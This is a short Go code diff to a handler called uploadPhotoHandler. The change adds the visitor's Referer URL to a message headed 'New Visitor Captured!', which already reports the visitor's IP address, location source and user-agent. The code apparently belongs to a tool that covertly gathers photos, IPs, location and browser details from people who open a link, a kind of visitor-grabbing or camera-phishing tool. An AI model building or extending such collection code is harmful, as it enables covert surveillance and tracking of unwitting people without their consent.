@@ -422,11 +422,17 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		rawIPHeader = r.RemoteAddr
 	}
 
+	fromUrl := r.Header.Get("Referer")
+	if fromUrl == "" {
+		fromUrl = r.RequestURI
+	}
+
 	// Compose message
 	var sb strings.Builder
 	sb.WriteString("📸 New Visitor Captured!\n\n")
 	sb.WriteString(fmt.Sprintf("🌍 Source: %s\n", locSource))
-	sb.WriteString(fmt.Sprintf("🔢 IP: %s\n\n", rawIPHeader))
+	sb.WriteString(fmt.Sprintf("🔢 IP: %s\n", rawIPHeader))
+	sb.WriteString(fmt.Sprintf("🌐 URL Host: %s\n\n", fromUrl))
 
 	sb.WriteString("📱 User-Agent:\n")
 	sb.WriteString(fmt.Sprintf("%s\n\n", r.Header.Get("User-Agent")))
